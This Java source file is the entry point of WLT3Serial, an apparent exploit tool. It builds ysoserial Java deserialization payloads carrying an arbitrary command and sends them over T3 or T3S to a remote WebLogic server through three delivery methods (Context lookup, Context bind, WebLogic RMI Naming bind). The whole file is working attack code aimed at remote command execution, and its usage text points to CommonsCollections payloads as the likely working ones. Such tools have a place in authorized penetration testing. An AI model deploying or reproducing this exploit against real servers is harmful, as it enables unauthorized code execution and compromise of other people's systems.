/*

Options:

SSL
exploit-type

*/

package bort.millipede.wlt3;

import java.util.Collections;
import java.util.List;
import java.util.ArrayList;

//third-party includes
import ysoserial.Strings;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;
import ysoserial.payloads.util.Gadgets;

public class WLT3Serial {
	public static void main(String[] args) throws Exception {
		if(args.length<4) {
			usage();
			return;
		}
		
		//set required options
		String host = args[args.length-4];
		int port = -1;
		try {
			port = Integer.parseInt(args[args.length-3]);
		} catch(NumberFormatException nfe) {
			System.err.println("Error: Invalid port "+args[args.length-3]+"");
			return;
		}
		String payloadType = args[args.length-2];
		String command = args[args.length-1];
		boolean t3s = false;
		String method = "Property";
		boolean verbose = false;
		
		//parse OPTIONS from command-line
		if(args.length>4) {
			int lastOpt = args.length-5;
			boolean methSet = false;
			boolean tlsSet = false;
			for(int i=0;i<=lastOpt;i++) {
				String opt = args[i];
				opt = opt.trim();
				if(opt.length()!=0 && opt.length()>=2) {
					switch(opt) {
						default: //invalid argument
							System.err.println("Error: Invalid option \""+opt+"\"\n");
							usage();
							return;
						case "--help": //print usage
							usage();
							return;
						case "--verbose":
							verbose=true;
							break;
						case "--method=Property":
							if(!methSet) {
								method = "Property";
								methSet = true;
							} else {
								System.err.println("Error: Multiple Exploit Methods set, please choose only one method\n");
								usage();
								return;
							}
							break;
						case "--method=Bind":
							if(!methSet) {
								method = "Bind";
								methSet = true;
							} else {
								System.err.println("Error: Multiple Exploit Methods set, please choose only one method\n");
								usage();
								return;
							}
							break;
						case "--method=WLBind":
							if(!methSet) {
								method = "WLBind";
								methSet = true;
							} else {
								System.err.println("Error: Multiple Exploit Methods set, please choose only one method\n");
								usage();
								return;
							}
							break;
						case "--t3s":
						case "--t3s=TLSv1.2":
							if(!tlsSet) {
								t3s = true;
								System.setProperty("jdk.tls.client.protocols","TLSv1.2");
								tlsSet = true;
							} else {
								System.err.println("Error: Multiple TLS version options set, please choose only one version\n");
								usage();
								return;
							}
							break;
						case "--t3s=TLSv1.1":
							if(!tlsSet) {
								t3s = true;
								System.setProperty("jdk.tls.client.protocols","TLSv1.1");
								tlsSet = true;
							} else {
								System.err.println("Error: Multiple TLS version options set, please choose only one version\n");
								usage();
								return;
							}
							break;
						case "--t3s=TLSv1":
							if(!tlsSet) {
								t3s = true;
								System.setProperty("jdk.tls.client.protocols","TLSv1");
								tlsSet = true;
							} else {
								System.err.println("Error: Multiple TLS version options set, please choose only one version\n");
								usage();
								return;
							}
							break;
					}
				} else {
					System.err.println("Error: Invalid option \""+opt+"\"\n");
					return;
				}
			}
		}
		
		//check validity of inputted ysoserial payload type, and generate ysoserial payload
		final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
		if(payloadClass == null) {
			System.err.println("Error: Invalid payload type \""+payloadType+"\"! Ensure that ysoserial jar file is in classpath, and check Usage (--help option) for available payload types!");
			return;
		}
		final ObjectPayload payload = payloadClass.newInstance();
		final Object object = payload.getObject(command);
		
		//run exploit
		System.out.print("Connecting to WebLogic Server at "+(t3s ? "t3s" : "t3" )+"://"+host+":"+Integer.toString(port)+": ... ");
		switch(method) {
			case "Property":
				ContextExploit.runPropertyExploit(object,host,port,t3s,verbose);
				break;
			case "Bind":
				ContextExploit.runBindExploit(object,host,port,t3s,verbose);
				break;
			case "WLBind":
				WLNamingExploit.runWLBindExploit(object,host,port,t3s,verbose);
				break;
		}
	}
	
	//print Usage information
	private static void usage() {
		System.err.println("Usage: WLT3Serial [OPTIONS] REMOTE_HOST REMOTE_PORT PAYLOAD_TYPE PAYLOAD_CMD");
		System.err.println("\nOptions:");
		System.err.println("\t--help\t\t\t\tprint usage (you\'re lookin at it)\n");
		System.err.println("\t--verbose\t\t\tVerbose output (including full thrown exceptions) (NOT YET IMPLEMENTED)\n");
		System.err.println("\t--method=EXPLOIT_METHOD\t\tExploit Method for delivering generated ysoserial payload");
		System.err.println("\t\tExploit Methods:\n\t\t\tProperty\tSend ysoserial payload as connection environment property value (Default, javax.naming.Context.lookup(), similar to JavaUnserializeExploits weblogic.py)");
		System.err.println("\t\t\tBind\t\tSend ysoserial payload as object to bind to name (via javax.naming.Context.bind(), also similar to JavaUnserializeExploits weblogic.py)");
		System.err.println("\t\t\tWLBind\t\tSend ysoserial payload as WebLogic RMI object to bind to name (via weblogic.rmi.Naming.bind(), similar to ysoserial.exploit.RMIRegistryExploit)\n");
		System.err.println("\t--t3s[=PROTOCOL]\t\tUse T3S (transport-encrypted) connection (Disabled by default)");
		System.err.println("\t\tProtocols:\n\t\t\tTLSv1.2 (Default)");
		System.err.println("\t\t\tTLSv1.1\n\t\t\tTLSv1");
		System.err.println("\t\t\t(Note: SSLv2 and SSLv3 are unsupported at this time.)\n\n");
		
		System.err.println("Available Payload Types (WebLogic is usually vulnerable to \"CommonsCollectionsX\" types):");
		try {
			final List<Class<? extends ObjectPayload>> payloadClasses = new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
			Collections.sort(payloadClasses, new Strings.ToStringComparator());
			for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
				System.err.println("\t"+payloadClass.getSimpleName());
			}
			System.err.println("");
		} catch(NoClassDefFoundError ncdfe) {
			System.err.println("\tNo ysoserial object payload classes found! Ensure that ysoserial jar file is in classpath when executing WLT3Serial!\n");
		} catch(Exception e) {
			System.err.println("\tUnknown Error occurred while listing ysoserial object payload classes ("+e.getClass().getName()+")!");
		}
	}
}
